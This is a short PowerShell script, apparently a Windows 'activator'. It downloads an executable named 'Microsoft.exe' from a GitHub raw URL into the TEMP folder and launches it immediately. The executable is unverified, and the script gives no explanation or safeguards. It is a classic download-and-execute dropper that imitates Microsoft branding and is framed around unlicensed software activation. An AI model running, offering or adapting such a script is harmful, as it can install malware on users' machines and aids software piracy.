$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft.exe"
$tempFile = "$env:TEMP\Microsoft.exe"


Invoke-WebRequest -Uri $url -OutFile $tempFile


Start-Process $tempFile





